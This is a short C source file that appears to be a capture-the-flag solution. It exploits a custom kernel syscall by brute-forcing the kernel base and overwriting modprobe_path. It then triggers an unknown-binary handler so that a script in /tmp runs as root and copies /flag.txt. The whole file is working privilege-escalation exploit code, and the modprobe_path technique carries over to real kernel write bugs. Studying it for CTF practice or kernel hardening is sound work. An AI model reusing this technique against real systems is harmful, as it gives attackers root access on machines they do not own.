#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#define __NR_echo 548

typedef unsigned long ul;

void setup() {
	system("echo -ne '#!/bin/sh\ncat /flag.txt > /tmp/flag' > /tmp/p");
	system("chmod a+x /tmp/p");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
}

void finish() {
	system("/tmp/executeme ; cat /tmp/flag");
}

int main() {
	ul modprobe_offset = 0x037cc0;
	
	setup();

	for(ul i=0; i<256; i++) {
		for(ul j=0; j<0xf; j++) {
			ul target = 0xffffffff00000000L + (i << 24) + (j << 20);
			target += modprobe_offset;
			syscall(__NR_echo, target, "/tmp/p");
		}
	}
	
	finish();

	return 0;
}
